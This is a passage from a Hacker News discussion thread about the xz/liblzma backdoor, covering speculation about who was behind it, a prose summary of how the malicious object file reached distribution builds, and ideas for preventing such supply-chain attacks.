| [next](#39899141) [–]  NSO Group They are an Israel based company, that sell zero-click RCEs for phones and more. Such malicious software was involved in the murder of journalist Jamal Khashoggi. Their exploits, developed in-house as well as presumably partially bought on the black market, are some of the most sophisticated exploits found in the wild, e.g. [https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-i...](https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html) > JBIG2 doesn't have scripting capabilities, but when combined with a vulnerability, it does have the ability to emulate circuits of arbitrary logic gates operating on arbitrary memory. So why not just use that to build your own computer architecture and script that!? That's exactly what this exploit does. Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It's not as fast as Javascript, but it's fundamentally computationally equivalent. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39899846)   | [root](#39897091) | [parent](#39899253) | [next](#39899141) [–]  > that sell zero-click RCEs Exactly my point. They do not sell backdoors. Don't get me wrong, still icky, but definitely not a "very well engineered, multi-year software backdoors" | | --- | --- | --- | | | |  |  | [xvector](user?id=xvector) [9 months ago](item?id=39899886)   | [root](#39897091) | [parent](#39899846) | [next](#39902315) [–]  They implant backdoors and sell zero-click RCEs that exploit those backdoors. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39901166)   | [root](#39897091) | [parent](#39899886) | [next](#39902315) [–]  That's a pretty strong claim. Do you have any evidence they have done this? And i mean, i'm genuinely curious. I don't think they would be above doing so if they had the opportunity, i just haven't heard of any instances where they were caught doing so. | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39902315)   | [root](#39897091) | [parent](#39899846) | [prev](#39899886) | [next](#39899141) [–]  I’m not sure why you’re making that point; the exploit we are talking about \_is\_ an RCE. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39902431)   | [root](#39897091) | [parent](#39902315) | [next](#39899141) [–]  The person i was replying to claimed that countries like usa rely on hardware modification while countries like israel rely on back-doors. This does not seem to be the case. Israel doesn't (or at least hasn't been caught) making backdoors, while the usa actually has (e.g. Dual\_EG). RCE is a broad category and includes many things. That said, while technically the liblzma thing is an RCE, supply chain attacks aren't really what most people mean when they talk about an RCE vulnerability. | | --- | --- | --- | | | |  |  | [hammock](user?id=hammock) [9 months ago](item?id=39899141)   | [root](#39897091) | [parent](#39898851) | [prev](#39899253) | [next](#39899118) [–]  Bob Maxwell (Ghislaine's father) sold backdoored software to corporations and governments all around the world, including US targets, on behalf of Israel's Mossad. "The Maxwell-Mossad team steals spy software PROMIS from the United States, Mossad puts an undetectable trap door in it so Mossad can track the activities of anyone using it, then Maxwell sells it around the world (including back to the U.S. -- with the trap door)." <https://kclibrary.bibliocommons.com/v2/record/S120C257904> | | --- | --- | --- | | | |  |  | [ginko](user?id=ginko) [9 months ago](item?id=39899118)   | [root](#39897091) | [parent](#39898851) | [prev](#39899141) | [next](#39899112) [–]  Probably Stuxnet. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39899851)   | [root](#39897091) | [parent](#39899118) | [next](#39899112) [–]  Stuxnet was not a backdoor. | | --- | --- | --- | | | |  |  | [markus92](user?id=markus92) [9 months ago](item?id=39899112)   | [root](#39897091) | [parent](#39898851) | [prev](#39899118) | [next](#39897316) [–]  Stuxnet? | | --- | --- | --- | | | |  |  | [wolverine876](user?id=wolverine876) [9 months ago](item?id=39897316)   | [parent](#39897091) | [prev](#39898851) | [next](#39898596) [–]  > The USA seems to have an affinity for hardware interdiction as opposed to software backdoors. What are some examples? | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [9 months ago](item?id=39897524)   | [root](#39897091) | [parent](#39897316) | [next](#39897421) [–]  <https://en.wikipedia.org/wiki/Tailored_Access_Operations> | | --- | --- | --- | | | |  |  | [acid\_\_](user?id=acid__) [9 months ago](item?id=39900357)   | [root](#39897091) | [parent](#39897524) | [next](#39897421) [–]  Be sure to check out the mentioned catalog. [1] The NSA's capabilities back in 2008 were pretty astonishing: "RAGEMASTER" A $30 device that taps a VGA cable and transmits the contents of your screen to the NSA van sitting outside! Crazy stuff. Makes you wonder what they've built in the last 15 years. [1] <https://en.wikipedia.org/wiki/ANT_catalog> | | --- | --- | --- | | | |  |  | [masklinn](user?id=masklinn) [9 months ago](item?id=39902581)   | [root](#39897091) | [parent](#39900357) | [next](#39897421) [–]  Today you’ve got open access USB cable which can stream your shit out on WiFi, no doubt the NSA has worse. | | --- | --- | --- | | | |  |  | [nick238](user?id=nick238) [9 months ago](item?id=39897421)   | [root](#39897091) | [parent](#39897316) | [prev](#39897524) | [next](#39898596) [–]  The Clipper chip? Not sure if that's what they had in mind. Nowadays it's maybe just how the NSA has rooms attached to backbone providers like [https://theintercept.com/2018/06/25/att-internet-nsa-spy-hub...](https://theintercept.com/2018/06/25/att-internet-nsa-spy-hubs/) | | --- | --- | --- | | | |  |  | [gowld](user?id=gowld) [9 months ago](item?id=39898596)   | [parent](#39897091) | [prev](#39897316) | [next](#39899336) [–]  This goes back to WWII. USA solves problems with manufacturing and money. Europeans relatively lack both, so they solve problems with their brains. | | --- | --- | --- | | | |  |  | [hybridtupel](user?id=hybridtupel) [9 months ago](item?id=39898756)   | [root](#39897091) | [parent](#39898596) | [next](#39899336) [–]  Israel is not in Europe | | --- | --- | --- | | | |  |  | [Alezz](user?id=Alezz) [9 months ago](item?id=39899401)   | [root](#39897091) | [parent](#39898756) | [next](#39899336) [–]  The perfect definition of Europe is if they took part in the Eurovision Song Contest. | | --- | --- | --- | | | |  |  | [nmat](user?id=nmat) [9 months ago](item?id=39899625)   | [root](#39897091) | [parent](#39899401) | [next](#39899336) [–]  Australia participates in the Eurovision Song Contest. | | --- | --- | --- | | | |  |  | [jessekv](user?id=jessekv) [9 months ago](item?id=39911291)   | [root](#39897091) | [parent](#39899625) | [next](#39900669) [–]  But they know they are "not the same". | | --- | --- | --- | | | |  |  | [willsmith72](user?id=willsmith72) [9 months ago](item?id=39900669)   | [root](#39897091) | [parent](#39899625) | [prev](#39911291) | [next](#39899336) [–]  and now i get to identify as european in heated internet debates | | --- | --- | --- | | | |  |  | [greggsy](user?id=greggsy) [9 months ago](item?id=39899336)   | [parent](#39897091) | [prev](#39898596) | [next](#39899403) [–]  I mean, they’re just the high profile ones. China makes and ships a lot of hardware, and the US makes and ships a lot of software. | | --- | --- | --- | | | |  |  | [fpgaminer](user?id=fpgaminer) [9 months ago](item?id=39899403)   | [parent](#39897091) | [prev](#39899336) | [next](#39896409) [–]  My completely unexpert opinion, informed by listening to all the episodes of Darknet Diaries, agrees with this. US intelligence likes to just bully/bribe/blackmail the supply chain. They've got crypto chops, but I don't recall any terribly sophisticated implants like this one (except Stuxnet, which was likely Israel's work funded/assisted by the US). NK isn't terribly sophisticated, and their goal is money, so that doesn't match either. Russia is all over the place in terms of targets/sophistication/etc because of their laws (AFAIK it's legal for any citizen to wage cyberwarfare on anything and everything except domestically), but this feels a bit beyond anything I recall them accomplishing at a state level. Israeli organizations have a long history of highly sophisticated cyberwarfare (Stuxnet, NSO group, etc), and they're good about protecting their access to exploits. That seems to fit the best. That said, saying "Israeli organization" casts a wide net since it's such a boiling hotspot for cybersecurity professionals. Could be the work of the government, could be co-sponsored by the US, or could just be a group of smart people building another NSO group. | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39900034)   | [root](#39897091) | [parent](#39899403) | [next](#39896409) [–]  > Russia is all over the place in terms of targets/sophistication/etc ... but this feels a bit beyond anything I recall them accomplishing at a state level. [https://en.wikipedia.org/wiki/Triton\_(malware)](https://en.wikipedia.org/wiki/Triton_%28malware%29) ([https://www.justice.gov/opa/pr/four-russian-government-emplo...](https://www.justice.gov/opa/pr/four-russian-government-employees-charged-two-historical-hacking-campaigns-targeting-critical)) | | --- | --- | --- | | | |  |  | [jobs\_throwaway](user?id=jobs_throwaway) [9 months ago](item?id=39896409)   | [prev](#39897091) | [next](#39897883) [–]  Imagine how frustrating it has to be for the attacker to meticulously plan and execute this and get foiled so late in the game, and so publicly | | --- | --- | --- | | | |  |  | [zoeysmithe](user?id=zoeysmithe) [9 months ago](item?id=39897442)   | [parent](#39896409) | [next](#39896528) [–]  This actor, and others like them, may have dozens or hundreds of these things out there. We don't know. This was only found accidentally, not via code review. | | --- | --- | --- | | | |  |  | [pixl97](user?id=pixl97) [9 months ago](item?id=39896528)   | [parent](#39896409) | [prev](#39897442) | [next](#39896428) [–]  So who's started scanning open source lib test cases for more stuff like this? | | --- | --- | --- | | | |  |  | [beefnugs](user?id=beefnugs) [9 months ago](item?id=39898460)   | [root](#39896409) | [parent](#39896528) | [next](#39898942) [–]  Like everything else in this world, its utterly and completely unfixably broken: There is no way you can have complex huge dependencies properly. The best most paranoid thing is to have multiple networking layers hoping they have to exploit multiple things at once, and whitelist only networking for exactly what you are expecting to happen. (which is completely incompatible with the idea of ssl, we would need a new type of firewall that sits between ALL applications before encryption, like a firewall between applications and the crypto library itself, which breaks a bunch of other things people want to do) | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39924793)   | [root](#39896409) | [parent](#39898460) | [next](#39898942) [–]  You can have complex huge dependencies, provided that they can be audited *properly*. Which means that, for starters, they need to be broken into smaller chunks for which the behavior can be fully specified. They need to be written in languages that are, inasmuch as it is possible, formally verifiable against the spec, even at considerable expense of performance. And where that is not possible, the languages still need to be the kind where any behavior that is not straightforward sticks out like a sore thumb. Then once you do all that, of course, you have one particular *version* that has been audited and can be used as a dependency. Which means that "ship early, ship often" and "move fast and break things" are completely off the table. In short, it means doing more or less the exact opposite of the trends in the industry for the past 50 years or so. Starting with rewriting everything that we already have. And it will be insanely expensive, of course, because the sheer amount of man-hours needed on all this are massive. Nor can you get away with cheap disposable labor for most of it, since writing specs and formal proofs and doing audits all requires a very skilled labor force. | | --- | --- | --- | | | |  |  | [slaymaker1907](user?id=slaymaker1907) [9 months ago](item?id=39898942)   | [root](#39896409) | [parent](#39896528) | [prev](#39898460) | [next](#39896428) [–]  I think it would help to try and secure signing infrastructure as much as possible. First of all, try to have 3 devs for any given project (this is the most difficult step). Make sure logging into or changing any of the signing stuff requires at least 2 of the devs, one to initiate the JIT and one to monitor. Additionally, take supply chain steps like requiring independent approval for PRs and requiring the signing process to only work with automated builds. Don't allow for signing bits that were built on a dev machine. Finally, I think it would help to start implementing signing executables and scripts which get checked at runtime. Windows obviously does executable signing, but it largely doesn't sign stuff like Python scripts. JS in the browser is kind of signed given that the whole site is signed via https. It's not perfect, but it would help in preventing one program from modifying another for very sensitive contexts like web servers. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39899002)   | [root](#39896409) | [parent](#39898942) | [next](#39900114) [–]  I do not think any of that would have prevented this situation. | | --- | --- | --- | | | |  |  | [slaymaker1907](user?id=slaymaker1907) [9 months ago](item?id=39899871)   | [root](#39896409) | [parent](#39899002) | [next](#39900114) [–]  Upon further reading, I think you might be correct. I initially thought a good signing process would be sufficient since it sounded like this malicious blob was secretly being included in the tarball by the build server, but it instead seems to be the case that the malicious binary was included in the repo as a test file. You could probably still protect against this sort of attack using signing, but it would be much more laborious and annoying to get working. The idea is that you would somehow declare that OpenSSH binaries must be signed by a \*particular\* key/authority, that VS Code is signed by Microsoft, Chrome signed by Google, etc. Additionally, the config declaring all of this obviously needs to be secured so you'd need to lock down access to those files (changing key associations would need to require more permissions than just updating old software or installing new software to be useful). | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39900255)   | [root](#39896409) | [parent](#39899871) | [next](#39900114) [–]  It was both. The binary object file was obfuscated in two "test" xz files in the repo itself. The code to extract the object file and inject it into the build process was only in the GitHub release tarball. The code in the tarball could have been prevented if only automated tarballs were permitted (for instance, GitHub's branch/tag source tarballs) or caught after the fact by verifying the file hashes in the tarball against those in the repo. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39901159)   | [root](#39896409) | [parent](#39900255) | [next](#39900114) [–]  > The code to extract the object file and inject it into the build process was only in the GitHub release tarball. I thought it was in both, however the backdoor wasn't inserted with the default build time options, so it ended up in the tarball, but not if you just did make unless you set things up the same as the build server. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39901564)   | [root](#39896409) | [parent](#39901159) | [next](#39900114) [–]  The release tarball contained code that can't be generated from the repo, no matter what settings you use. JiaT75 created the release on GitHub which involves creating a description and uploading tarballs. Their PGP key has been used to sign them since May 2023. 1. The repo contained two test xz files which contained the obfuscated exploit .o file 2. JiaT75 created the release on GitHub which allows you to upload your own tarball for the release. 3. The release tarball contained a modified build-to-host.m4 that extracted the exploit .o so it would be linked into the library if building on a Linux x86-64 machine. 4. Fedora/Debian/whoever pulled the release source tarball from GitHub and ran their builds for x86-64 Linux which caused the exploit .o file to be linked into the binary they then packaged up for release | | --- | --- | --- | | | |  |  | [j-krieger](user?id=j-krieger) [9 months ago](item?id=39900114)   | [root](#39896409) | [parent](#39898942) | [prev](#39899002) | [next](#39896428) [–]  All this riffraff and OSS maintainers basically work for free. | | --- | --- | --- | | | |  |  | [Alifatisk](user?id=Alifatisk) [9 months ago](item?id=39896428)   | [parent](#39896409) | [prev](#39896528) | [next](#39897883) [–]  Must be punching the air right now | | --- | --- | --- | | | |  |  | [cellis](user?id=cellis) [9 months ago](item?id=39896498)   | [root](#39896409) | [parent](#39896428) | [next](#39896510) [–]  Or...falling back on less noticed contingency plans... | | --- | --- | --- | | | |  |  | [Ekaros](user?id=Ekaros) [9 months ago](item?id=39896646)   | [root](#39896409) | [parent](#39896498) | [next](#39896510) [–]  My pet theory is that this was just one project they have been running for years. They are likely doing many more at same time. Slowly inserting parts in various projects and getting their contributors inside the projects. | | --- | --- | --- | | | |  |  | [SAI\_Peregrinus](user?id=SAI_Peregrinus) [9 months ago](item?id=39899681)   | [root](#39896409) | [parent](#39896646) | [next](#39897294) [–]  If it's an intelligence agency exploit, this is nearly certain. Getting agents hired as employees of foreign companies to provide intelligence is an ancient practice. Getting agents to be open source maintainers is a continuation of the same thing. | | --- | --- | --- | | | |  |  | [0cf8612b2e1e](user?id=0cf8612b2e1e) [9 months ago](item?id=39897294)   | [root](#39896409) | [parent](#39896646) | [prev](#39899681) | [next](#39898019) [–]  That seems like a safe bet. If you are planning a multi year operation, it would be silly to do it all under a single account. Best to minimize the blast radius if any single exploit gets discovered. | | --- | --- | --- | | | |  |  | [guyomes](user?id=guyomes) [9 months ago](item?id=39898019)   | [root](#39896409) | [parent](#39896646) | [prev](#39897294) | [next](#39896510) [–]  Some of this activity was actually documented through the alleged data breach of a hacking company [1]. [1]: <https://en.wikipedia.org/wiki/Hacking_Team> | | --- | --- | --- | | | |  |  | [noobermin](user?id=noobermin) [9 months ago](item?id=39896510)   | [root](#39896409) | [parent](#39896428) | [prev](#39896498) | [next](#39896588) [–]  Or, they must be strapped into a chair having teeth being pulled out by whoever directed them. | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39924820)   | [root](#39896409) | [parent](#39896510) | [next](#39896588) [–]  Why would they be? You don't get far with this kind of approach to valuable skilled human resources. | | --- | --- | --- | | | |  |  | [TechDebtDevin](user?id=TechDebtDevin) [9 months ago](item?id=39896588)   | [root](#39896409) | [parent](#39896428) | [prev](#39896510) | [next](#39897883) [–]  Likely a team of people at a three letter agency. | | --- | --- | --- | | | |  |  | [morkalork](user?id=morkalork) [9 months ago](item?id=39896754)   | [root](#39896409) | [parent](#39896588) | [next](#39896877) [–]  I wonder if they have OKRs too. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39896877)   | [root](#39896409) | [parent](#39896588) | [prev](#39896754) | [next](#39897883) [–]  Everyone keeps saying this but it seems unlikely to me that they'd do this for a relatively short window of opportunity and leave their methods for all to see. | | --- | --- | --- | | | |  |  | [avidiax](user?id=avidiax) [9 months ago](item?id=39897170)   | [root](#39896409) | [parent](#39896877) | [next](#39897554) [–]  You are judging this by the outcome, as though it were pre-ordained, and also assuming that this is the only method this agency has. It is much more likely that this backdoor would have gone unnoticed for months or years. The access this backdoor provides would be used only once per system, to install other APT (advanced persistent threats), probably layers of them. Use a typical software RAT or rootkit as the first layer. If that is discovered, fallback to the private keys you stole, or the social engineer the company directory you copied. If that fails, rely on the firmware rootkit that only runs if it's timer hasn't been reset in 6 months. Failing that, re-use this backdoor if it's still available. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39898248)   | [root](#39896409) | [parent](#39897170) | [next](#39897554) [–]  It was found in a few weeks so why is it more likely it wouldn't have been noticed for months/years with more people running the backdoored version of the code? | | --- | --- | --- | | | |  |  | [ufo](user?id=ufo) [9 months ago](item?id=39898682)   | [root](#39896409) | [parent](#39898248) | [next](#39897554) [–]  We were lucky that the backdoor called attention to itself, because it impacted the performance off ssh and introduced valgrind warnings. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39900260)   | [root](#39896409) | [parent](#39898682) | [next](#39897554) [–]  Doesn't that further suggest non-state actor(s)? | | --- | --- | --- | | | |  |  | [ufo](user?id=ufo) [9 months ago](item?id=39901453)   | [root](#39896409) | [parent](#39900260) | [next](#39897554) [–]  I've heard that it was only detected because the developer that found it was using different compiler flags than the default. Under default settings, the backdoor was stealthier. | | --- | --- | --- | | | |  |  | [AtNightWeCode](user?id=AtNightWeCode) [9 months ago](item?id=39897554)   | [root](#39896409) | [parent](#39896877) | [prev](#39897170) | [next](#39897883) [–]  My guess is that a ransomware group is behind this. Even if the backdoor had gone into production servers it would have been found fairly quickly if used at some scale. | | --- | --- | --- | | | |  |  | [TheBlight](user?id=TheBlight) [9 months ago](item?id=39898226)   | [root](#39896409) | [parent](#39897554) | [next](#39897883) [–]  >My guess is that a ransomware group is behind this. My bet would be that they were after a crypto exchange(s) where they've already compromised some level of access and want to get deeper into the backend. >Even if the backdoor had gone into production servers it would have been found fairly quickly if used at some scale. I agree. Yes it's possible the backdoor could've gone unnoticed for months/years but I think the perp would've had to assume not. | | --- | --- | --- | | | |  |  | [aborsy](user?id=aborsy) [9 months ago](item?id=39897883)   | [prev](#39896409) | [next](#39896168) [–]  Why ED448? It’s almost never recommended, in favor of curve 25519. | | --- | --- | --- | | | |  |  | [throitallaway](user?id=throitallaway) [9 months ago](item?id=39898311)   | [parent](#39897883) | [next](#39898280) [–]  As I understand it Ed448 was only recently added to openssh, so maybe it was chosen in order to evade detection by analysis tools that scan for keys (if such a thing is possible.) | | --- | --- | --- | | | |  |  | [juitpykyk](user?id=juitpykyk) [9 months ago](item?id=39900375)   | [root](#39897883) | [parent](#39898311) | [next](#39898280) [–]  Some tools scan for crypto algorithms, typically by searching for the magic numbers, Ed448 is so new many tools probably don't recognize it. Malware authors frequently change the crypto magic numbers to prevent detection. | | --- | --- | --- | | | |  |  | [stock\_toaster](user?id=stock_toaster) [9 months ago](item?id=39898280)   | [parent](#39897883) | [prev](#39898311) | [next](#39896168) [–]  I believe ed25519 offers 128 bits of security, while ed448 offers 224 bits of security. ed448 has larger key sizes too, which does seem like an odd choice in this case. Maybe it was chosen for obscurity sake (being less commonly used)? | | --- | --- | --- | | | |  |  | [arnaudsm](user?id=arnaudsm) [9 months ago](item?id=39896168)   | [prev](#39897883) | [next](#39897372) [–]  Have we seen exploitation in the wild yet? | | --- | --- | --- | | | |  |  | [winkelmann](user?id=winkelmann) [9 months ago](item?id=39896286)   | [parent](#39896168) | [next](#39896518) [–]  I assume the operation has most likely been called off. Their goal was probably to wait until it got into stable distros. I doubt there is a large number of unstable Debian or Fedora Rawhide servers with open SSH in the wild. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39896518)   | [parent](#39896168) | [prev](#39896286) | [next](#39897372) [–]  If it hadn't been discovered for another month or so, then it would have appeared in stable Fedora 40, Ubuntu 24.4 and Debian, and then it definitely would have been exploited. Another year it would have been in RHEL 10. Very luck escape. | | --- | --- | --- | | | |  |  | [bclemens](user?id=bclemens) [9 months ago](item?id=39901892)   | [root](#39896168) | [parent](#39896518) | [next](#39897372) [–]  Nope, it wouldn't have been in RHEL 10 or any of the rebuilds. CentOS Stream 10 already branched from Fedora / ELN. The closest it would have gotten is a Fedora ELN compose, and it's doubtful it would have remained undiscovered long enough to end up in CentOS Stream 11. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39903168)   | [root](#39896168) | [parent](#39901892) | [next](#39897372) [–]  We likely would have backported the change. I'm already planning a big rebase of packages that missed the Fedora 40 / C10S branch (related to RISC-V in that case). | | --- | --- | --- | | | |  |  | [wolverine876](user?id=wolverine876) [9 months ago](item?id=39897372)   | [prev](#39896168) | [next](#39902972) [–]  Have the heads of the targeted projects - including xz (Lasse Collin?), OpenSSH (Theo?), and Linux (Linus) - commented on it? I'm especially interested in how such exploits can be prevented in the future. | | --- | --- | --- | | | |  |  | [strunz](user?id=strunz) [9 months ago](item?id=39898084)   | [parent](#39897372) | [next](#39898617) [–]  [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27): >Lasse regularly has internet breaks and is on one at the moment, started before this all kicked off. He has posted an update at <https://tukaani.org/xz-backdoor/> and is working with the community. | | --- | --- | --- | | | |  |  | [gowld](user?id=gowld) [9 months ago](item?id=39898617)   | [parent](#39897372) | [prev](#39898084) | [next](#39902972) [–]  OpenSSH and Linux were not targeted/affected. xz and the Debian distribtion of OpenSSH were targeted. | | --- | --- | --- | | | |  |  | [pama](user?id=pama) [9 months ago](item?id=39899878)   | [root](#39897372) | [parent](#39898617) | [next](#39899501) [–]  The core source of the vulnerability (symbol lookup order allowing a dependency to preempt a function) might theoretically be fixed at the Linux+OpenSSH level. | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39900123)   | [root](#39897372) | [parent](#39899878) | [next](#39900019) [–]  Damien Miller (OpenSSH maintainer, OpenBSD committer) has written a patch that implements the relevant libsystemd functionality without libsystemd: <https://bugzilla.mindrot.org/show_bug.cgi?id=2641#c13> | | --- | --- | --- | | | |  |  | [wolverine876](user?id=wolverine876) [9 months ago](item?id=39900019)   | [root](#39897372) | [parent](#39899878) | [prev](#39900123) | [next](#39899501) [–]  It's in their ecosystem; they should be concerned about other similar attacks and about addressing the fears of many users, developers, etc. | | --- | --- | --- | | | |  |  | [cpach](user?id=cpach) [9 months ago](item?id=39899501)   | [root](#39897372) | [parent](#39898617) | [prev](#39899878) | [next](#39902972) [–]  Fedora too. | | --- | --- | --- | | | |  |  | [EasyMark](user?id=EasyMark) [9 months ago](item?id=39902972)   | [prev](#39897372) | [next](#39902183) [–]  This whole thing makes me wonder if AI could detect "anomalies" like the human who found the actual hack did. Observe a system (lots of systems) and use that data to spot anomylous behavior from "new" versions of packages being added, throw up a red flag that is like "this really doesn't act like it did in the past because parameter(s) are unusual given previous versions" | | --- | --- | --- | | | |  |  | [pixelfarmer](user?id=pixelfarmer) [9 months ago](item?id=39903026)   | [parent](#39902972) | [next](#39903112) [–]  Just needs a fine grained enough set of parameters that are observed on a system, aka "monitoring", and flag anything that sticks out. No need for "AI" unless the parameters that are monitored have more of a (complex) pattern to them than some value +/- deviation or similar things. "AI" is, in an abstract way, a pattern matcher and replacer, but also a big cannon that is often not needed and simpler heuristics work faster and better (and are usually deterministic). | | --- | --- | --- | | | |  |  | [lpapez](user?id=lpapez) [9 months ago](item?id=39903112)   | [parent](#39902972) | [prev](#39903026) | [next](#39902183) [–]  Anomaly, fraud, outlier detection... AI has been trying to solve that for several decades and in my experience in production these systems usually end up being a set of expert written rules saying "if X is greater than Y, notify someone to check". | | --- | --- | --- | | | |  |  | [mjburgess](user?id=mjburgess) [9 months ago](item?id=39906022)   | [root](#39902972) | [parent](#39903112) | [next](#39902183) [–]  The issue is that fraud is anti-inductive: when it's discovered, it changes. Statistical AI systems are just naive induction, and so largely useless. | | --- | --- | --- | | | |  |  | [cgh](user?id=cgh) [9 months ago](item?id=39902183)   | [prev](#39902972) | [next](#39902192) [–]  Comment I saw on Ars: >Interestingly enough, "Jia Tan" is very close to 加蛋 in Mandarin, meaning "to add an egg". Unlikely to be a real name or a coincidence. | | --- | --- | --- | | | |  |  | [picture](user?id=picture) [9 months ago](item?id=39902478)   | [parent](#39902183) | [next](#39911199) [–]  Jia Tan could mean literally anything as pinyin since it doesn't have diacritics for tone. 嘉坛 (Jiā tán) could be a totally plausible name, and so could 佳檀 (also Jiā tán). Chinese names can largely use any character that doesn't come with a really bad meaning | | --- | --- | --- | | | |  |  | [AnotherGoodName](user?id=AnotherGoodName) [9 months ago](item?id=39902740)   | [root](#39902183) | [parent](#39902478) | [next](#39911199) [–]  Yeah a quick Google brings up lots of real Jia Tans who clearly aren't behind this and hopefully aren't being wrongly accused here. But it is clearly a real and common name. | | --- | --- | --- | | | |  |  | [shp0ngle](user?id=shp0ngle) [9 months ago](item?id=39902771)   | [root](#39902183) | [parent](#39902740) | [next](#39911199) [–]  As other poster said, Chinese has diacritics that got usually removed when put into English websites | | --- | --- | --- | | | |  |  | [xign](user?id=xign) [9 months ago](item?id=39911199)   | [parent](#39902183) | [prev](#39902478) | [next](#39902767) [–]  Jia Tan is absolute a possible real name. Most people commenting on this topic aren't even Chinese native speakers lol. Each pinyin can map to a lot of different Chinese characters because they are missing the tone of the character anyway. Tan is a real Chinese surname, and could be mandarin or hokkien. Either way the name is likely made up. Obviously the attacker wasn't going to just use their real names. | | --- | --- | --- | | | |  |  | [shp0ngle](user?id=shp0ngle) [9 months ago](item?id=39902767)   | [parent](#39902183) | [prev](#39911199) | [next](#39902192) [–]  There are many real Jia Tans on LinkedIn | | --- | --- | --- | | | |  |  | [AlexanderTheGr8](user?id=AlexanderTheGr8) [9 months ago](item?id=39902192)   | [prev](#39902183) | [next](#39896577) [–]  Is there any progress on identifying the attacker? This would make it much easier to find out it this was really a state-sponsored attack. If this backdoor can be classified as a crime, github logs can identify the IP/location/other details of the attacker which is more than enough to identify them, unless their OPSEC is perfect, which it almost never is (e.g. Ross Ulbricht). | | --- | --- | --- | | | |  |  | [yodsanklai](user?id=yodsanklai) [9 months ago](item?id=39896577)   | [prev](#39902192) | [next](#39901829) [–]  Do we know who's the attacker? | | --- | --- | --- | | | |  |  | [toasteros](user?id=toasteros) [9 months ago](item?id=39896854)   | [parent](#39896577) | [next](#39897451) [–]  The name that keeps coming up is Jia Tan (<https://github.com/JiaT75/>) but we have no way of knowing if this is a real name, pseudonym, or even a collective of people. | | --- | --- | --- | | | |  |  | [pphysch](user?id=pphysch) [9 months ago](item?id=39897263)   | [root](#39896577) | [parent](#39896854) | [next](#39897813) [–]  Given the sophistication of this attack it would indeed be downright negligent to presume that it's the attackers' legal name and that they have zero OPSEC. | | --- | --- | --- | | | |  |  | [xvector](user?id=xvector) [9 months ago](item?id=39899985)   | [root](#39896577) | [parent](#39897263) | [next](#39897813) [–]  He used ProtonMail. I wonder if ProtonMail can pull IP logs for this guy and share them. | | --- | --- | --- | | | |  |  | [eklitzke](user?id=eklitzke) [9 months ago](item?id=39900297)   | [root](#39896577) | [parent](#39899985) | [next](#39897813) [–]  It might be worth looking into, but: 1) Probably by design protonmail doesn't keep these kinds of logs around for very long 2) Hacking groups pretty much always proxy their connection through multiple layers of machines they've rooted, making it very difficult or impossible to actually trace back to the original IP | | --- | --- | --- | | | |  |  | [xvector](user?id=xvector) [9 months ago](item?id=39903381)   | [root](#39896577) | [parent](#39900297) | [next](#39897813) [–]  For [1], unfortunately it does. True regarding the second point. [1]: [https://techcrunch.com/2021/09/06/protonmail-logged-ip-addre...](https://techcrunch.com/2021/09/06/protonmail-logged-ip-address-of-french-activist-after-order-by-swiss-authorities/) | | --- | --- | --- | | | |  |  | [ajross](user?id=ajross) [9 months ago](item?id=39897813)   | [root](#39896577) | [parent](#39896854) | [prev](#39897263) | [next](#39906976) [–]  It's also worth pointing out, given the almost two years of seemingly valuable contribution, that this could be a real person who was compromised or coerced into pushing the exploit. | | --- | --- | --- | | | |  |  | [stefan\_](user?id=stefan_) [9 months ago](item?id=39899718)   | [root](#39896577) | [parent](#39897813) | [next](#39906976) [–]  It’s also worth pointing out that parts of the RCE were prepared almost two years ago which makes this entirely implausible. | | --- | --- | --- | | | |  |  | [ajross](user?id=ajross) [9 months ago](item?id=39900228)   | [root](#39896577) | [parent](#39899718) | [next](#39906976) [–]  Were they? The attacker has had commit rights for 1.5 years or so, but my understanding is that all the exploit components were recent commits. Is that wrong? | | --- | --- | --- | | | |  |  | [agentdrek](user?id=agentdrek) [9 months ago](item?id=39906976)   | [root](#39896577) | [parent](#39896854) | [prev](#39897813) | [next](#39897451) [–]  Interesting to look through the "starred" repos of that account ... seems like a hit list: <https://github.com/JiaT75?tab=stars> | | --- | --- | --- | | | |  |  | [cellis](user?id=cellis) [9 months ago](item?id=39897451)   | [parent](#39896577) | [prev](#39896854) | [next](#39897493) [–]  I'd say Ned Stark Associates, Fancy Bear, etc. | | --- | --- | --- | | | |  |  | [FergusArgyll](user?id=FergusArgyll) [9 months ago](item?id=39897493)   | [parent](#39896577) | [prev](#39897451) | [next](#39901829) [–]  This Guy <https://news.ycombinator.com/item?id=39877604> | | --- | --- | --- | | | |  |  | [blah-yeah](user?id=blah-yeah) [9 months ago](item?id=39900485)   | [root](#39896577) | [parent](#39897493) | [next](#39901829) [–]  It's alleged to be 